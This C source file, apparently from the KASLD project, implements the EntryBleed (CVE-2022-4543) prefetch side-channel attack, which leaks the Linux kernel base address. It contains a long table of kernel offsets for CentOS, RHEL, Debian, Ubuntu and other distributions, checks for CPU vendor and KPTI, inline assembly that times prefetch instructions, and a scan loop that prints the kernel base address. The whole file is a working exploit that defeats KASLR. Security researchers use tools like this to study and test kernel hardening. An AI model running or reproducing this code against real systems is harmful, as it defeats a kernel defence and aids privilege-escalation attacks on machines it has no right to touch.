// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EntryBleed (CVE-2022-4543) prefetch side-channel address leak.
//
// Works on Intel x86_64 CPUs with KPTI enabled or disabled.
// Works on AMD x86_64 CPUs with KPTI disabled.
//
// Leaks adddress for entry_SYSCALL_64 symbol (when KPTI is enabled);
// or address for __start_rodata symbol (when KPTI is disabled).
//
// These symbols are located at a static offset from the kernel base
// address even if FG-KASLR is enabled.
//
// Patched in kernel ~v6.2 on 2022-12-16:
// https://github.com/torvalds/linux/commit/97e3d26b5e5f371b3ee223d94dd123e6c442ba80
//
// Uses original proof of concept code by Will:
// https://www.willsroot.io/2022/12/entrybleed.html
//
// References:
// https://gruss.cc/files/prefetch.pdf
// https://www.openwall.com/lists/oss-security/2022/12/16/3
// https://www.willsroot.io/2022/12/entrybleed.html
// https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html
// https://bugs.chromium.org/p/project-zero/issues/detail?id=2351
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

struct kernel_info {
  const char *kernel_version;
  uint64_t entry_syscall_64;
  uint64_t start_rodata;
};

// clang-format off
// offsets must be page aligned
struct kernel_info offsets[] = {
    // CentOS
    {"4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019",                                    0xa00000, 0xe00000},
    {"4.18.0-147.el8.x86_64 #1 SMP Wed Dec 4 21:51:45 UTC 2019",                                   0xa00000, 0xe00000},
    {"4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020",                                   0xa00000, 0xe00000},
    {"4.18.0-240.el8.x86_64 #1 SMP Fri Sep 25 19:48:47 UTC 2020",                                  0xa00000, 0xe00000},

    // RHEL
    {"4.18.0-80.el8.x86_64 #1 SMP Wed Mar 13 12:02:46 UTC 2019",                                   0xa00000, 0xe00000},
    {"4.18.0-240.el8.x86_64 #1 SMP Wed Sep 23 05:13:10 EDT 2020",                                  0xa00000, 0xe00000},
    {"4.18.0-348.el8.x86_64 #1 SMP Mon Oct 4 12:17:22 EDT 2021",                                   0xa00000, 0xe00000},
    {"4.18.0-425.3.1.el8.x86_64 #1 SMP Fri Sep 30 11:45:06 EDT 2022",                              0xa00000, 0xe00000},
    {"5.14.0-70.22.1.el9_0.x86_64 #1 SMP PREEMPT Tue Aug 2 10:02:12 EDT 2022",                     0xc00000, 0x1000000},
    {"5.14.0-162.6.1.el9_1.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Sep 30 07:36:03 EDT 2022",            0xc00000, 0x1000000},

    // Rocky Linux
    {"4.18.0-348.el8.0.2.x86_64 #1 SMP Sun Nov 14 00:51:12 UTC 2021",                              0xa00000, 0xe00000},

    // Debian 11.0
    {"5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03)",                                        0xa00000, 0xe00000},
    {"5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23)",                                        0xa00000, 0xe00000},
    {"5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28)",                                       0xa00000, 0xe00000},
    {"5.10.0-12-amd64 #1 SMP Debian 5.10.103-1 (2022-03-07)",                                      0xa00000, 0xe00000},
    {"5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29)",                                      0xa00000, 0xe00000},
    {"5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09)",                                      0xa00000, 0xe00000},
    {"5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23)",                                      0xa00000, 0xe00000},
    {"5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13)",                                      0xa00000, 0xe00000},
    {"5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02)",                                      0xa00000, 0xe00000},
    {"5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21)",                                      0xa00000, 0xe00000},
    {"5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13)",                                      0xa00000, 0xe00000},

    // Fedora
    {"4.18.16-300.fc29.x86_64 #1 SMP Sat Oct 20 23:24:08 UTC 2018",                                0xa00000, 0xe00000},
    {"5.0.9-301.fc30.x86_64 #1 SMP Tue Apr 23 23:57:35 UTC 2019",                                  0xa00000, 0xe00000},
    {"5.3.7-301.fc31.x86_64 #1 SMP Mon Oct 21 19:18:58 UTC 2019",                                  0xa00000, 0xe00000},
    {"5.8.15-301.fc33.x86_64 #1 SMP Thu Oct 15 16:58:06 UTC 2020",                                 0xc00000, 0x1000000},
    {"5.14.10-300.fc35.x86_64 #1 SMP Thu Oct 7 20:48:44 UTC 2021",                                 0xe00000, 0x1200000},
    {"5.17.5-300.fc36.x86_64 #1 SMP PREEMPT Thu Apr 28 15:51:30 UTC 2022",                         0xe00000, 0x1200000},

    // Manjaro
    {"4.19.23-1-MANJARO #1 SMP PREEMPT Fri Feb 15 21:27:33 UTC 2019",                              0xa00000, 0xe00000},
    {"5.2.11-1-MANJARO #1 SMP PREEMPT Thu Aug 29 07:41:24 UTC 2019",                               0xa00000, 0xe00000},
    {"5.4.18-1-MANJARO #1 SMP PREEMPT Thu Feb 6 11:41:30 UTC 2020",                                0xa00000, 0xe00000},

    // NOTE: EntryBleed for Ubuntu 5.4.0-x kernels works on Intel but produces unreliable results on AMD
    {"5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020",                               0xc00000, 0x1000000},
    {"5.4.0-65-generic #73~18.04.1-Ubuntu SMP Tue Jan 19 09:02:24 UTC 2021",                       0xc00000, 0x1000000},
    {"5.4.0-77-generic #86~18.04.1-Ubuntu SMP Fri Jun 18 01:23:22 UTC 2021",                       0xc00000, 0x1000000},
    {"5.4.0-89-generic #100~18.04.1-Ubuntu SMP Wed Sep 29 10:59:42 UTC 2021",                      0xc00000, 0x1000000},
    {"5.4.0-135-generic #152~18.04.2-Ubuntu SMP Tue Nov 29 08:23:49 UTC 2022",                     0xc00000, 0x1000000},

    // Ubuntu 18.04
    {"4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019",                              0xa00000, 0xe00000},
    {"4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019",                              0xa00000, 0xe00000},
    {"5.3.0-40-generic #32~18.04.1-Ubuntu SMP Mon Feb 3 14:05:59 UTC 2020",                        0xc00000, 0x1000000},

    // Ubuntu 19.04
    {"5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019",                                0xc00000, 0x1000000},

    // Ubuntu 20.04
    {"5.8.0-23-generic #24~20.04.1-Ubuntu SMP Sat Oct 10 04:57:02 UTC 2020",                       0xc00000, 0x1000000},
    {"5.8.0-63-generic #71~20.04.1-Ubuntu SMP Thu Jul 15 17:46:08 UTC 2021",                       0xc00000, 0x1000000},
    {"5.11.0-22-generic #23~20.04.1-Ubuntu SMP Thu Jun 17 12:51:00 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-25-generic #27~20.04.1-Ubuntu SMP Tue Jul 13 17:41:23 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-27-generic #29~20.04.1-Ubuntu SMP Wed Aug 11 15:58:17 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-36-generic #40~20.04.1-Ubuntu SMP Sat Sep 18 02:14:19 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-38-generic #42~20.04.1-Ubuntu SMP Tue Sep 28 20:41:07 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-40-generic #44~20.04.2-Ubuntu SMP Tue Oct 26 18:07:44 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-41-generic #45~20.04.1-Ubuntu SMP Wed Nov 10 10:20:10 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-43-generic #47~20.04.2-Ubuntu SMP Mon Dec 13 11:06:56 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-44-generic #48~20.04.2-Ubuntu SMP Tue Dec 14 15:36:44 UTC 2021",                      0xc00000, 0x1000000},
    {"5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022",                       0xc00000, 0x1000000},
    {"5.13.0-21-generic #21~20.04.1-Ubuntu SMP Tue Oct 26 15:49:20 UTC 2021",                      0xe00000, 0x1200000},
    {"5.13.0-22-generic #22~20.04.1-Ubuntu SMP Tue Nov 9 15:07:24 UTC 2021",                       0xe00000, 0x1200000},
    {"5.13.0-23-generic #23~20.04.2-Ubuntu SMP Fri Dec 10 12:06:47 UTC 2021",                      0xe00000, 0x1200000},
    {"5.13.0-23-lowlatency #23~20.04.2-Ubuntu SMP PREEMPT Fri Dec 10 13:47:24 UTC 2021",           0xe00000, 0x1200000},
    {"5.13.0-25-generic #26~20.04.1-Ubuntu SMP Fri Jan 7 16:27:40 UTC 2022",                       0xe00000, 0x1200000},
    {"5.13.0-27-generic #29~20.04.1-Ubuntu SMP Fri Jan 14 00:32:30 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-28-generic #31~20.04.1-Ubuntu SMP Wed Jan 19 14:08:10 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-30-generic #33~20.04.1-Ubuntu SMP Mon Feb 7 14:25:10 UTC 2022",                       0xe00000, 0x1200000},
    {"5.13.0-35-generic #40~20.04.1-Ubuntu SMP Mon Mar 7 09:18:32 UTC 2022",                       0xe00000, 0x1200000},
    {"5.13.0-37-generic #42~20.04.1-Ubuntu SMP Tue Mar 15 15:44:28 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-39-generic #44~20.04.1-Ubuntu SMP Thu Mar 24 16:43:35 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022",                       0xe00000, 0x1200000},
    {"5.13.0-41-generic #46~20.04.1-Ubuntu SMP Wed Apr 20 13:16:21 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-44-generic #49~20.04.1-Ubuntu SMP Wed May 18 18:44:28 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-48-generic #54~20.04.1-Ubuntu SMP Thu Jun 2 23:37:17 UTC 2022",                       0xe00000, 0x1200000},
    {"5.13.0-51-generic #58~20.04.1-Ubuntu SMP Tue Jun 14 11:29:12 UTC 2022",                      0xe00000, 0x1200000},
    {"5.13.0-52-generic #59~20.04.1-Ubuntu SMP Thu Jun 16 21:21:28 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-33-generic #34~20.04.1-Ubuntu SMP Thu May 19 15:51:16 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-41-generic #44~20.04.1-Ubuntu SMP Fri Jun 24 13:27:29 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-43-generic #46~20.04.1-Ubuntu SMP Thu Jul 14 15:20:17 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-46-generic #49~20.04.1-Ubuntu SMP Thu Aug 4 19:15:44 UTC 2022",                       0xe00000, 0x1200000},
    {"5.15.0-48-generic #54~20.04.1-Ubuntu SMP Thu Sep 1 16:17:26 UTC 2022",                       0xe00000, 0x1200000},
    {"5.15.0-50-generic #56~20.04.1-Ubuntu SMP Tue Sep 27 15:51:29 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-53-generic #59~20.04.1-Ubuntu SMP Thu Oct 20 15:10:22 UTC 2022",                      0xe00000, 0x1200000},
    {"5.15.0-56-generic #62~20.04.1-Ubuntu SMP Tue Nov 22 21:24:20 UTC 2022",                      0xe00000, 0x1200000},

    // Ubuntu 21.04
    {"5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021",                              0xe00000, 0x1200000},
    {"5.11.0-16-lowlatency #17-Ubuntu SMP PREEMPT Thu Apr 15 00:23:40 UTC 2021",                   0xe00000, 0x1200000},
    {"5.11.0-22-generic #23-Ubuntu SMP Thu Jun 17 00:34:23 UTC 2021",                              0xe00000, 0x1200000},

    // Ubuntu 22.04
    {"5.15.0-24-lowlatency #24-Ubuntu SMP PREEMPT Thu Mar 31 10:02:54 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-25-generic #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-27-generic #28-Ubuntu SMP Thu Apr 14 04:55:28 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-27-lowlatency #28-Ubuntu SMP PREEMPT Tue Apr 19 15:27:08 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-30-generic #31-Ubuntu SMP Thu May 5 10:00:34 UTC 2022",                               0xe00000, 0x1200000},
    {"5.15.0-30-lowlatency #31-Ubuntu SMP PREEMPT Thu May 5 12:24:00 UTC 2022",                    0xe00000, 0x1200000},
    {"5.15.0-33-generic #34-Ubuntu SMP Wed May 18 13:34:26 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-33-lowlatency #34-Ubuntu SMP PREEMPT Wed May 18 15:38:29 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-35-generic #36-Ubuntu SMP Sat May 21 02:24:07 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-35-lowlatency #36-Ubuntu SMP PREEMPT Mon May 23 15:33:44 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-37-generic #39-Ubuntu SMP Wed Jun 1 19:16:45 UTC 2022",                               0xe00000, 0x1200000},
    {"5.15.0-37-lowlatency #39-Ubuntu SMP PREEMPT Thu Jun 2 17:44:08 UTC 2022",                    0xe00000, 0x1200000},
    {"5.15.0-39-generic #42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022",                               0xe00000, 0x1200000},
    {"5.15.0-39-lowlatency #42-Ubuntu SMP PREEMPT Fri Jun 10 12:00:27 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-40-generic #43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-40-lowlatency #43-Ubuntu SMP PREEMPT Thu Jun 16 17:07:13 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-41-generic #44-Ubuntu SMP Wed Jun 22 14:20:53 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-41-lowlatency #44-Ubuntu SMP PREEMPT Wed Jun 22 15:40:35 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-43-generic #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-43-lowlatency #46-Ubuntu SMP PREEMPT Thu Jul 14 13:54:59 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-46-generic #49-Ubuntu SMP Thu Aug 4 18:03:25 UTC 2022",                               0xe00000, 0x1200000},
    {"5.15.0-46-lowlatency #49-Ubuntu SMP PREEMPT Thu Aug 4 18:56:09 UTC 2022",                    0xe00000, 0x1200000},
    {"5.15.0-48-generic #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-48-lowlatency #54-Ubuntu SMP PREEMPT Wed Aug 31 12:53:08 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-50-generic #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-50-lowlatency #56-Ubuntu SMP PREEMPT Wed Sep 21 13:57:05 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-52-lowlatency #58-Ubuntu SMP PREEMPT Thu Oct 13 12:37:18 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-53-lowlatency #59-Ubuntu SMP PREEMPT Thu Oct 20 12:38:19 UTC 2022",                   0xe00000, 0x1200000},
    {"5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022",                              0xe00000, 0x1200000},
    {"5.15.0-56-lowlatency #62-Ubuntu SMP PREEMPT Wed Nov 23 09:50:07 UTC 2022",                   0xe00000, 0x1200000},

    // openSUSE Leap 15
    {"4.12.14-lp151.28.10-default #1 SMP Sat Jul 13 17:59:31 UTC 2019 (0ab03b7)",                  0x800000, 0xc00000},
    {"5.14.21-150400.24.38-default #1 SMP PREEMPT_DYNAMIC Fri Dec 9 09:29:22 UTC 2022 (e9c5676)",  0xc00000, 0x1000000},

    // Oracle Linux
    {"4.18.0-147.el8.x86_64 #1 SMP Tue Nov 12 11:05:49 PST 2019",                                  0xa00000, 0xe00000},
    {"5.14.0-162.6.1.el9_1.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov 15 15:13:28 PST 2022",            0xc00000, 0x1000000},

    // Slackware 15
    {"5.15.80 #1 SMP PREEMPT Sun Nov 27 13:28:05 CST 2022",                                        0xc00000, 0x1000000},

    // Linux Mint
    {"4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018",                              0xa00000, 0xe00000},

    // Kali
    {"5.19.0-kali2-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.19.11-1kali2 (2022-10-10)",               0xa00000, 0xe00000},
    {"6.0.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.0.10-2kali1 (2022-12-06)",                 0xa00000, 0xe00000},
};
// clang-format on

struct utsname get_kernel_version() {
  struct utsname u;
  int rv = uname(&u);
  if (rv != 0) {
    printf("[-] uname()\n");
    exit(1);
  }
  return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define KERNEL_VERSION_SIZE_BUFFER 512

int detect_kernel_version() {
  struct utsname u;
  char kernel_version[KERNEL_VERSION_SIZE_BUFFER];

  u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] system is not using a 64-bit kernel\n");
    exit(1);
  }

  snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, "%s %s", u.release,
           u.version);

  int i;
  for (i = 0; i < ARRAY_SIZE(offsets); i++) {
    if (strcmp(kernel_version, offsets[i].kernel_version) == 0) {
      printf("[.] kernel version '%s' detected\n", offsets[i].kernel_version);
      return i;
    }
  }

  printf("[-] kernel version '%s' not recognized\n", kernel_version);
  return -1;
}

bool detect_cpu_pti_flag() {
  bool pti = false;
  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
  char *line = 0;
  size_t size = 0;
  while (getline(&line, &size, cpuinfo) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = true;
      break;
    }
  }
  free(line);
  fclose(cpuinfo);
  return pti;
}

int detect_cpu_vendor() {
  int cpu = 0;
  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
  char *line = 0;
  size_t size = 0;
  while (getline(&line, &size, cpuinfo) != -1) {
    if (strstr(line, "vendor") == NULL)
      continue;

    if (strstr(line, "AuthenticAMD") != NULL) {
      cpu = 1;
      break;
    }
    if (strstr(line, "Intel") != NULL) {
      cpu = 2;
      break;
    }
  }
  free(line);
  fclose(cpuinfo);
  return cpu;
}

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  __asm__ volatile(".intel_syntax noprefix;"
                   "mfence;"
                   "rdtscp;"
                   "mov %0, rax;"
                   "mov %1, rdx;"
                   "xor rax, rax;"
                   "lfence;"
                   "prefetchnta qword ptr [%4];"
                   "prefetcht2 qword ptr [%4];"
                   "xor rax, rax;"
                   "lfence;"
                   "rdtscp;"
                   "mov %2, rax;"
                   "mov %3, rdx;"
                   "mfence;"
                   ".att_syntax;"
                   : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                   : "r"(addr)
                   : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / KERNEL_ALIGN

uint64_t leak_syscall_entry(uint64_t offset) {
  uint64_t data[ARR_SIZE] = {0};
  uint64_t min = ~0, addr = ~0;
  uint64_t SCAN_START = KERNEL_BASE_MIN + offset;

  int iterations = 100;
  int dummy_iterations = 5;
  int i;
  uint64_t idx;
  for (i = 0; i < iterations + dummy_iterations; i++) {
    for (idx = 0; idx < ARR_SIZE; idx++) {
      uint64_t test = SCAN_START + idx * KERNEL_ALIGN;
      syscall(104);
      uint64_t time = sidechannel(test);
      if (i >= dummy_iterations)
        data[idx] += time;
    }
  }

  for (i = 0; i < ARR_SIZE; i++) {
    data[i] /= iterations;
    if (data[i] < min) {
      min = data[i];
      addr = SCAN_START + i * KERNEL_ALIGN;
    }
    // printf("%llx %ld\n", (SCAN_START + i * KERNEL_ALIGN), data[i]);
  }

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr - offset;

  return 0;
}

unsigned long get_kernel_addr_entrybleed() {
  int cpu = detect_cpu_vendor();

  if (cpu == 0) {
    printf("[-] Unknown CPU vendor\n");
    return 0;
  }

  int pti = detect_cpu_pti_flag();

  printf("[.] %s CPU with KPTI %s\n", (cpu == 1 ? "AMD" : "Intel"),
         (pti ? "enabled" : "disabled"));

  if (cpu == 1 && pti == 1) {
    printf(
        "[-] AMD systems with KPTI enabled are not affected by EntryBleed\n");
    return 0;
  }

  int kernel = detect_kernel_version();

  if (kernel == -1)
    return 0;

  uint64_t offset = offsets[kernel].start_rodata;
  if (pti)
    offset = offsets[kernel].entry_syscall_64;

  // Verify with several attempts
  unsigned long addr = leak_syscall_entry(offset);
  int iterations = 3;
  int i;
  for (i = 0; i < iterations; i++) {
    if (addr != leak_syscall_entry(offset)) {
      addr = 0;
      printf("[-] Inconsistent results. Aborting ...\n");
      break;
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");

  unsigned long addr = get_kernel_addr_entrybleed();
  if (!addr)
    return 1;

  printf("possible kernel base: %lx\n", addr);

  return 0;
}
